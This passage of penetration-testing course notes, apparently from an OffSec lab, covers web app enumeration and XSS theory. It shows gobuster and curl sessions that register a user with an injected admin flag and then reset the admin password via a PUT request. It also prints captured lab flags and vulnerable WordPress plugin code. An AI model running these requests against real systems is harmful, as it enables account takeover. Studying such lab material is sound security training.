+  -H &#39;Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew&#39; \
+  -d &#39;{&quot;password&quot;: &quot;pwned&quot;}&#39;
+
+{
+  &quot;detail&quot;: &quot;The method is not allowed for the requested URL.&quot;,
+  &quot;status&quot;: 405,
+  &quot;title&quot;: &quot;Method Not Allowed&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+</code></pre>
+<ul>
+<li>Application states that the method used is incorrect.</li>
+<li>We need to try another one.</li>
+<li>PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let&#39;s try to explicitly define it next.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ curl -X &#39;PUT&#39; \
+  &#39;http://192.168.50.16:5002/users/v1/admin/password&#39; \
+  -H &#39;Content-Type: application/json&#39; \
+  -H &#39;Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4&#39; \
+  -d &#39;{&quot;password&quot;: &quot;pwned&quot;}&#39;
+</code></pre>
+<ul>
+<li>We received no error message.</li>
+<li>We can assume that no error was thrown by the application backend logic.</li>
+<li>To prove that our attack succeeded, try logging in as admin using the newly-changed password.</li>
+</ul>
+<pre><code class="language-bash">kali@kali:~$ curl -d &#39;{&quot;password&quot;:&quot;pwned&quot;,&quot;username&quot;:&quot;admin&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.50.16:5002/users/v1/login
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}
+</code></pre>
+<ul>
+<li>These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs.</li>
+<li>Often due to lack of testing and secure coding best practices.</li>
+</ul>
+<p><strong>Recreate cURL example with Burp</strong></p>
+<ul>
+<li>Replicate the latest admin login attempt and send it to the proxy by appending the --proxy 127.0.0.1:8080 to the command.</li>
+<li>From Burp&#39;s Repeater tab, we can create a new empty request and fill it with the same data as we did previously.</li>
+<li>Click on the Send button and verify the incoming response on the right pane.</li>
+<li>Able to recreate the same behavior within our proxy.</li>
+<li>Enables us to store any tested APIs in its database for later investigation.</li>
+<li>Once we&#39;ve tested a number of different APIs navigate to the Target tab and then Site map.</li>
+<li>Can then retrieve the entire map of the paths we have been testing so far.</li>
+<li>We can track the API we discovered and forward any saved request to the Repeater or Intruder for further testing.</li>
+</ul>
+<hr>
+<h6>Web App Enumeration Exercise Notes</h6>
+<p><strong>Nmap NSE script pattern grep</strong></p>
+<p>To match patterns and find flags, try <code>http-grep.nse</code></p>
+<pre><code>$ less /usr/share/nmap/scripts/http-grep.nse
+</code></pre>
+<p>See the <code>BUILT_IN_PATTERNS</code>  for examples, you can match a pattern to find a flag as shown.  Note the <code>--script-args=&#39;match=&quot;OS{[A-Za-z0-9%.%%%+%-]+}&quot;,breakonmatch&#39;</code> argument for finding <code>OS{*}</code> where the wildcard is A-Z, a-z, 0-9.</p>
+<pre><code>$ nmap -p 80 192.168.225.16 --script http-grep --script-args=&#39;match=&quot;OS{[A-Za-z0-9%.%%%+%-]+}&quot;,breakonmatch&#39;
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-06 21:58 EDT
+Nmap scan report for offsecwp (192.168.225.16)
+Host is up (0.075s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+| http-grep: 
+|   (1) http://offsecwp:80/?p=1: 
+|     (1) User Pattern 1: 
+|_      + OS{4718fd8ca9853fec64116c65e463961a}
+
+Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds
+</code></pre>
+<p><strong>Gobuster Notes</strong></p>
+<h1>If you get status code error:
+```
+$ sudo gobuster dir -u <a href="http://192.168.225.16">http://192.168.225.16</a> -w /usr/share/wordlists/dirb/big.txt -p gobuster.lst</h1>
+<h1>Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:            <a href="http://192.168.225.16">http://192.168.225.16</a>
+[+] Method:         GET
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Patterns:       gobuster.lst (2 entries)
+[+] Status codes:   401,403,204,301,302,307
+[+] User Agent:     gobuster/3.5
+[+] Timeout:        10s</h1>
+<h1>2023/08/06 21:23:14 Starting gobuster in directory enumeration mode</h1>
+<p>Error: the server returns a status code that matches the provided options for non existing urls. <a href="http://192.168.225.16/991ecf7c-4667-4bbe-a644-cb49a0419aea">http://192.168.225.16/991ecf7c-4667-4bbe-a644-cb49a0419aea</a> =&gt; 301 (Length: 0). To continue please exclude the status code or the length</p>
+<pre><code>
+Directory mode help `gobuster dir -h`
+
+Try with blacklist option set `-b` and/or `-s`:
+</code></pre>
+<h1>$ sudo gobuster dir -u <a href="http://192.168.225.16">http://192.168.225.16</a> -w /usr/share/wordlists/dirb/big.txt -p gobuster.lst -b &quot;204,301,302,307,401,403&quot;      </h1>
+<h1>Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</h1>
+<h1>[+] Url:                     <a href="http://192.168.225.16">http://192.168.225.16</a>
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
+[+] Patterns:                gobuster.lst (2 entries)
+[+] Negative Status codes:   204,301,302,307,401,403
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s</h1>
+<p>2023/08/06 21:23:40 Starting gobuster in directory enumeration mode</p>
+<pre><code>
+**API Abuse**
+
+Full workflow for exploiting vulnerable API.
+- Enumerate endpoints.
+- Determine allowed Methods.
+ - GET.
+ - POST.
+ - PUT.
+ - PATCH.
+- Note that manual probing with cURL may be required in some case, gobuster failed to find several endpoints.
+- Endpoint structure shown below interesting.
+ - Admin.
+  - Email.
+  - Password.
+- Check for `&#39;{&quot;admin&quot;:&quot;True&quot;}&#39;` if able to register.
+- Retrieve OAuth token, use for authenticated request.
+ - Cause general chaos.
+```bash
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.225.16:5002/users/v1/ -w /usr/share/wordlists/dirb/small.txt  
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.225.16:5002/users/v1/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/08/06 22:35:10 Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 200) [Size: 48]
+Progress: 959 / 960 (99.90%)
+===============================================================
+2023/08/06 22:35:25 Finished
+===============================================================
+
+┌──(kali㉿kali)-[~]
+└─$ gobuster dir -u http://192.168.225.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt 
+===============================================================
+Gobuster v3.5
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.225.16:5002/users/v1/admin/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.5
+[+] Timeout:                 10s
+===============================================================
+2023/08/06 22:16:30 Starting gobuster in directory enumeration mode
+===============================================================
+/email                (Status: 405) [Size: 142]
+/password             (Status: 405) [Size: 142]
+Progress: 959 / 960 (99.90%)
+===============================================================
+2023/08/06 22:16:47 Finished
+===============================================================
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1/admin/
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/problem+json
+Content-Length: 205
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:18:39 GMT
+
+{
+  &quot;detail&quot;: &quot;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&quot;,
+  &quot;status&quot;: 404,
+  &quot;title&quot;: &quot;Not Found&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1/admin/password 
+HTTP/1.0 405 METHOD NOT ALLOWED
+Content-Type: application/problem+json
+Content-Length: 142
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:18:48 GMT
+
+{
+  &quot;detail&quot;: &quot;The method is not allowed for the requested URL.&quot;,
+  &quot;status&quot;: 405,
+  &quot;title&quot;: &quot;Method Not Allowed&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1/admin/email   
+HTTP/1.0 405 METHOD NOT ALLOWED
+Content-Type: application/problem+json
+Content-Length: 142
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:18:58 GMT
+
+{
+  &quot;detail&quot;: &quot;The method is not allowed for the requested URL.&quot;,
+  &quot;status&quot;: 405,
+  &quot;title&quot;: &quot;Method Not Allowed&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1/login      
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/json
+Content-Length: 48
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:21:00 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1/register
+HTTP/1.0 404 NOT FOUND
+Content-Type: application/json
+Content-Length: 48
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:21:09 GMT
+
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;User not found&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;admin&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.225.16:5002/users/v1/login
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;Password is not correct for the given username.&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;bob&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.225.16:5002/users/v1/register
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;&#39;email&#39; is a required property&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;bob@youruncle.com&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.225.16:5002/users/v1/register
+{ &quot;status&quot;: &quot;fail&quot;, &quot;message&quot;: &quot;&#39;email&#39; is a required property&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;password&quot;:&quot;fake&quot;,&quot;username&quot;:&quot;bob&quot;,&quot;email&quot;:&quot;bob@youruncle.com&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.225.16:5002/users/v1/register
+{&quot;message&quot;: &quot;Successfully registered. Login to receive an auth token.&quot;, &quot;status&quot;: &quot;success&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 391
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:24:21 GMT
+
+{
+  &quot;users&quot;: [
+    {
+      &quot;email&quot;: &quot;mail1@mail.com&quot;, 
+      &quot;username&quot;: &quot;name1&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;mail2@mail.com&quot;, 
+      &quot;username&quot;: &quot;name2&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;admin@mail.com&quot;, 
+      &quot;username&quot;: &quot;admin&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;pwn@offsec.com&quot;, 
+      &quot;username&quot;: &quot;offsec&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;bob@youruncle.com&quot;, 
+      &quot;username&quot;: &quot;bob&quot;
+    }
+  ]
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;password&quot;:&quot;satam&quot;,&quot;username&quot;:&quot;enlil&quot;,&quot;email&quot;:&quot;admin@anu.com&quot;,&quot;admin&quot;:&quot;True&quot;}&#39; -H &#39;Content-Type: application/json&#39;  http://192.168.225.16:5002/users/v1/register
+{&quot;message&quot;: &quot;Successfully registered. Login to receive an auth token.&quot;, &quot;status&quot;: &quot;success&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.16:5002/users/v1
+HTTP/1.0 200 OK
+Content-Type: application/json
+Content-Length: 464
+Server: Werkzeug/1.0.1 Python/3.7.13
+Date: Mon, 07 Aug 2023 02:26:15 GMT
+
+{
+  &quot;users&quot;: [
+    {
+      &quot;email&quot;: &quot;mail1@mail.com&quot;, 
+      &quot;username&quot;: &quot;name1&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;mail2@mail.com&quot;, 
+      &quot;username&quot;: &quot;name2&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;admin@mail.com&quot;, 
+      &quot;username&quot;: &quot;admin&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;pwn@offsec.com&quot;, 
+      &quot;username&quot;: &quot;offsec&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;bob@youruncle.com&quot;, 
+      &quot;username&quot;: &quot;bob&quot;
+    }, 
+    {
+      &quot;email&quot;: &quot;admin@anu.com&quot;, 
+      &quot;username&quot;: &quot;enlil&quot;
+    }
+  ]
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;username&quot;:&quot;enlil&quot;,&quot;password&quot;:&quot;satam&quot;}&#39; -H &quot;Content-Type: application/json&quot; http://192.168.225.16:5002/users/v1/login
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTEzNzU1OTIsImlhdCI6MTY5MTM3NTI5Miwic3ViIjoiZW5saWwifQ.r16VYGFsu686HLMO3u0wYlgFjTeuhtWSBrbmsXp6rxU&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl &#39;http://192.168.225.16:5002/users/v1/admin/password&#39; -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTEzNzU1OTIsImlhdCI6MTY5MTM3NTI5Miwic3ViIjoiZW5saWwifQ.r16VYGFsu686HLMO3u0wYlgFjTeuhtWSBrbmsXp6rxU&#39; -d &#39;{&quot;password&quot;:&quot;annunaki&quot;}&#39; 
+{
+  &quot;detail&quot;: &quot;The method is not allowed for the requested URL.&quot;,
+  &quot;status&quot;: 405,
+  &quot;title&quot;: &quot;Method Not Allowed&quot;,
+  &quot;type&quot;: &quot;about:blank&quot;
+}
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -X &#39;PUT&#39; &#39;http://192.168.225.16:5002/users/v1/admin/password&#39; -H &#39;Content-Type: application/json&#39; -H &#39;Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTEzNzU1OTIsImlhdCI6MTY5MTM3NTI5Miwic3ViIjoiZW5saWwifQ.r16VYGFsu686HLMO3u0wYlgFjTeuhtWSBrbmsXp6rxU&#39; -d &#39;{&quot;password&quot;:&quot;annunaki&quot;}&#39;
+                                                                        
+┌──(kali㉿kali)-[~]
+└─$ curl -d &#39;{&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;annunaki&quot;}&#39; -H &quot;Content-Type: application/json&quot; http://192.168.225.16:5002/users/v1/login
+{&quot;auth_token&quot;: &quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2OTEzNzU4NTYsImlhdCI6MTY5MTM3NTU1Niwic3ViIjoiYWRtaW4ifQ.Ruwid9eTdK1SGrO6UTnr1K2Oj28gDPjyZFCOe5e32_A&quot;, &quot;message&quot;: &quot;Successfully logged in.&quot;, &quot;status&quot;: &quot;success&quot;}    
+</code></pre>
+<p><strong>Sitemaps</strong></p>
+<ul>
+<li>Always check both.<ul>
+<li><code>robots.txt</code></li>
+<li><code>sitemap.xml</code></li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.52/robots.txt
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 123
+Server: Werkzeug/2.0.2 Python/3.9.9
+Date: Mon, 07 Aug 2023 02:47:50 GMT
+
+&lt;pre&gt;
+# Group 1
+User-agent: Googlebot
+Disallow: /
+
+# Group 2
+User-agent: PWKStudents
+Disallow: /flagDCCF9186C3.html
+
+&lt;/pre&gt;                                                                             
+┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.52/flagDCCF9186C3.html
+HTTP/1.0 200 OK
+Content-Disposition: inline; filename=flagDCCF9186C3.html
+Content-Type: text/html; charset=utf-8
+Content-Length: 150
+Last-Modified: Mon, 07 Aug 2023 02:46:33 GMT
+Cache-Control: no-cache
+Date: Mon, 07 Aug 2023 02:48:05 GMT
+Server: Werkzeug/2.0.2 Python/3.9.9
+
+&lt;html&gt;
+        &lt;p&gt;
+        The flag part 1 is:&lt;br&gt;
+        &lt;code&gt;OS{fc71a6c233a9c40&lt;/code&gt;&lt;br&gt;&lt;br&gt;
+        Look for an important &lt;i&gt;map&lt;/i&gt; to find the second part.
+        &lt;/p&gt;
+&lt;/html&gt;
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.225.52/sitemap.xml        
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+
+&lt;urlset xmlns=&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot;&gt;
+
+  &lt;url&gt;
+
+     &lt;loc&gt;/index.html&lt;/loc&gt;
+
+     &lt;lastmod&gt;2020-02-29&lt;/lastmod&gt;
+
+     &lt;changefreq&gt;monthly&lt;/changefreq&gt;
+
+     &lt;priority&gt;0.4&lt;/priority&gt;
+
+  &lt;/url&gt;
+
+  &lt;url&gt;
+
+     &lt;loc&gt;/robots.txt&lt;/loc&gt;
+
+     &lt;lastmod&gt;2020-02-29&lt;/lastmod&gt;
+
+     &lt;changefreq&gt;monthly&lt;/changefreq&gt;
+
+     &lt;priority&gt;0.3&lt;/priority&gt;
+
+  &lt;/url&gt;
+
+  &lt;url&gt;
+
+    &lt;loc&gt;/flag6641EAFEB275.html&lt;/loc&gt;
+
+    &lt;lastmod&gt;2020-02-29&lt;/lastmod&gt;
+
+    &lt;changefreq&gt;weekly&lt;/changefreq&gt;
+
+    &lt;priority&gt;0.8&lt;/priority&gt;
+
+  &lt;/url&gt;
+
+&lt;/urlset&gt;     
+
+┌──(kali㉿kali)-[~]
+└─$ curl http://192.168.225.52/flag6641EAFEB275.html
+&lt;html&gt;
+        &lt;p&gt;
+        The flag part 2 is:&lt;br&gt;
+        &lt;code&gt;ef3818f02f2430005}&lt;/b&gt;&lt;br&gt;&lt;br&gt;
+
+        &lt;/p&gt;
+&lt;/html&gt;                           
+</code></pre>
+<p><strong>Non-Standard Headers</strong></p>
+<p>When you find strange strings in non-standard headers, decode:</p>
+<ul>
+<li><code>X-Something-Non-Standard: VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==</code></li>
+<li><code>echo &quot;VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==&quot; | base64 -d</code></li>
+</ul>
+<pre><code class="language-bash">┌──(kali㉿kali)-[~]
+└─$ curl -i http://192.168.225.52            
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 717
+X-Something-Non-Standard: VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==
+Server: Werkzeug/2.0.2 Python/3.9.9
+Date: Mon, 07 Aug 2023 03:32:25 GMT
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Non-Standard Responses&lt;/title&gt;
+&lt;style&gt;
+    body {
+        width: 35em;
+        margin: 0 auto;
+        font-family: Tahoma, Verdana, Arial, sans-serif;
+    }
+&lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1&gt;Welcome to Non-Standard Responses!&lt;/h1&gt;
+&lt;p&gt;Unfortunately, this website seems to be broken. It keeps giving out some &lt;em&gt;non-standard responses&lt;/em&gt;.
+  I do not know that has gotten into its &lt;em&gt;head&lt;/em&gt;. You should come back later once we have this under control.
+  Or, if you are really bored, you can investigate it more and let us know if you figure out what is going on.&lt;/p&gt;
+
+&lt;p&gt;This site reminds me so much of the default nginx template for some reason. So strange....&lt;/p&gt;
+&lt;/body&gt;
+&lt;/html&gt;                                                                             
+┌──(kali㉿kali)-[~]
+└─$ echo &quot;VGhlIGZsYWcgaXM6IE9TezNmMGE0YjdiNzc0NzNmZWIyNGJlZGMwMjY3YjNmMTRkfQ==&quot; | base64 -d
+The flag is: OS{3f0a4b7b77473feb24bedc0267b3f14d}   
+</code></pre>
+<p><strong>Examining Web Pages</strong></p>
+<p>Make sure to:</p>
+<ul>
+<li>Inspect page source.</li>
+<li>Check for JS functions available to console.</li>
+<li>Check CSS source and toggle on/off.</li>
+</ul>
+<hr>
+<h5>8.4 Cross-Site Scripting</h5>
+<ul>
+<li><pre><code>Understand Cross-Site Scripting vulnerability types.
+</code></pre>
+</li>
+<li><pre><code>Exploit basic Cross-Site Scripting.
+</code></pre>
+</li>
+<li><pre><code>Perform Privilege Escalation via Cross-Site Scripting.
+</code></pre>
+</li>
+</ul>
+<h6>Stored vs Reflected XSS Theory</h6>
+<ul>
+<li>XSS vuln classes.<ul>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Persistent_(or_stored)">Stored</a></li>
+<li>AKA Persistent, occur when exploit payload is stored in a DB or otherwise cached by the server.</li>
+<li>Website retrieves payload and displays it to anyone who visits a vulnerable page.</li>
+<li>Single stored XSS vuln can attack all of a sites users.</li>
+<li>Often exist in.</li>
+<li>Forum software.</li>
+<li>Comment sections.</li>
+<li>Product reviews.</li>
+<li>Essentially anywhere use content can be stored and reviewed later.</li>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Non-persistent_(reflected)">Reflected</a></li>
+<li>Include payload in a crafted request or link.</li>
+<li>Website takes the value and places it into page content.</li>
+<li>Only attacks the user submitting the request via the crafted link.</li>
+<li>Often occur in.</li>
+<li>Search fields and results.</li>
+<li>Anywhere user input is included in <code>Error</code> messages.</li>
+</ul>
+</li>
+<li>Either vuln class can manifest as.</li>
+<li>Client (browser)</li>
+<li>Server side.<ul>
+<li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting#Server-side_versus_DOM-based_vulnerabilities">DOM-based XSS</a><ul>
+<li>Takes place solely within the page&#39;s <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction">Document Object Model (DOM)</a></li>
+</ul>
+</li>
+<li>DOM (High Level) the browser parses the pages HTML content and then generates an internal DOM representation.</li>
+</ul>
+</li>
+<li>Occurs when the pages DOM is modified with user-controlled values.</li>
+<li>Can be stored or reflected.</li>
+<li>The key is that DOM-based XSS attacks occur when a browser parses the page&#39;s content and inserted JavaScript is executed.</li>
+<li>The injected scripts run under the context of the user visiting the affected page.</li>
+<li>The user&#39;s browser, not the web app, execute the XSS payload.<ul>
+<li>Impact can include:</li>
+</ul>
+</li>
+<li>Session hijacking.</li>
+<li>Forced redirection to malicious pages.</li>
+<li>Execution of local applications as user.</li>
+<li>Trojanized web applications.</li>
+</ul>
+<h6>JavaScript Refresher</h6>
+<p>JavaScript is a high-level programming language that has become one of the main components of modern web applications. All modern browsers include a JavaScript engine that runs JavaScript code from within the browser itself.</p>
+<p>When a browser processes a server&#39;s HTTP response containing HTML, the browser creates a DOM tree and renders it. The DOM is comprised of all forms, inputs, images, etc. related to the web page.</p>
+<p>JavaScript&#39;s role is to access and modify the page&#39;s DOM, resulting in a more interactive user experience. From an attacker&#39;s perspective, this also means that if we can inject JavaScript code into the application, we can access and modify the page&#39;s DOM. With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies.</p>
+<ul>
+<li>JS Variables.</li>
+<li>We don&#39;t assign just any type to the variable.
+ - JavaScript is a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Data_structures">loosely typed language</a></li>
+<li>This means that the actual type of the a variable is inferred as a Number type based on the type of the invoked function arguments, which are Number.</li>
+</ul>
+<h6>Identifying XSS Vulnerabilties</h6>
+<ul>
+<li>Find potential entry points for XSS vulns by examining web app.</li>
+<li>Identifying input fields that accept unsantized input.</li>
+<li>Which is then displayed as output on subsequent pages.</li>
+<li>Common special chars for XSS include.<ul>
+<li><code>&lt; &gt; &#39; &quot; { } ;</code></li>
+<li><code>&lt; &gt;</code> used by HTML to denote elements.</li>
+<li><code>{ }</code> used by JS to in function declarations.</li>
+<li><code>&#39;&#39;</code> and <code>&quot;&quot;</code> used to denote strings.</li>
+<li><code>;</code> mark end of statement.<ul>
+<li>If the application does not remove or encode these chars, it may be vulnerable to XSS because the app will interpret the chars as code.</li>
+</ul>
+</li>
+<li>In turn, enabling code to be injected.</li>
+</ul>
+</li>
+<li>Character encoding.</li>
+<li>Common types.
+ - <a href="https://en.wikipedia.org/wiki/Character_encodings_in_HTML#HTML_character_references">HTML encoding</a>
+     - HTML encoding (or character references) can be used to display characters that normally have special meanings, like tag elements.
+     - When encountering this type of encoding, the browser will not interpret the character as the start of an element, but will display the actual character as-is.
+ - <a href="https://en.wikipedia.org/wiki/Percent-encoding">URL encoding</a><ul>
+<li>Sometimes referred to as percent encoding, is used to convert non-ASCII and reserved characters in URLs, such as converting a space to &quot;%20&quot;.</li>
+</ul>
+</li>
+</ul>
+<p>If we can inject special characters into the page, the browser will treat them as code elements.  We can then build code that will execute in the user browser session when the malicious JS is loaded.  May need to use different sets of characters, depending on where our input is being included.</p>
+<p><strong>Example:</strong> if our input is being added between div tags, we&#39;ll need to include our own script tags and need to be able to inject &quot;&lt;&quot; and &quot;&gt;&quot; as part of the payload. If our input is being added within an existing JavaScript tag, we might only need quotes and semicolons to add our own code.</p>
+<h6>Basic XSS</h6>
+<p>The WordPress installation is running a plugin named Visitors that is <a href="https://www.exploit-db.com/exploits/49972">vulnerable to stored XSS</a>. The plugin&#39;s main feature is to log the website&#39;s visitor data, including the IP, source, and User-Agent fields.</p>
+<p>The source code for the plugin can be <a href="https://downloads.wordpress.org/plugin/visitors-app.0.3.zip">downloaded from its website</a>. If we inspect the <code>database.php</code> file, we can verify how the data is stored inside the WordPress database:</p>
+<pre><code>
+
+function VST_save_record() {
+    global $wpdb;
+    $table_name = $wpdb-&gt;prefix . &#39;VST_registros&#39;;
+
+    VST_create_table_records();
+
+    return $wpdb-&gt;insert(
+                $table_name,
+                array(
+                    &#39;patch&#39; =&gt; $_SERVER[&quot;REQUEST_URI&quot;],
+                    &#39;datetime&#39; =&gt; current_time( &#39;mysql&#39; ),
+                    &#39;useragent&#39; =&gt; $_SERVER[&#39;HTTP_USER_AGENT&#39;],
+                    &#39;ip&#39; =&gt; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]
+                )
+            );
+}
+</code></pre>
+<p>The PHP function is responsible for parsing various HTTP request headers, including the User-Agent, which is saved in the <code>useragent</code> record value.
+<strong>NOTE:</strong> <code>X-Forwarded-For</code> may also be vulnerable!!!</p>
+<p>Next, each time a WordPress administrator loads the Visitor plugin, the function will execute the following portion of code from <code>start.php</code>:</p>
+<pre><code>$i=count(VST_get_records($date_start, $date_finish));
+foreach(VST_get_records($date_start, $date_finish) as $record) {
+    echo &#39;
+        &lt;tr class=&quot;active&quot; &gt;
+            &lt;td scope=&quot;row&quot; &gt;&#39;.$i.&#39;&lt;/td&gt;
+            &lt;td scope=&quot;row&quot; &gt;&#39;.date_format(date_create($record-&gt;datetime), get_option(&quot;links_updated_date_format&quot;)).&#39;&lt;/td&gt;
+            &lt;td scope=&quot;row&quot; &gt;&#39;.$record-&gt;patch.&#39;&lt;/td&gt;
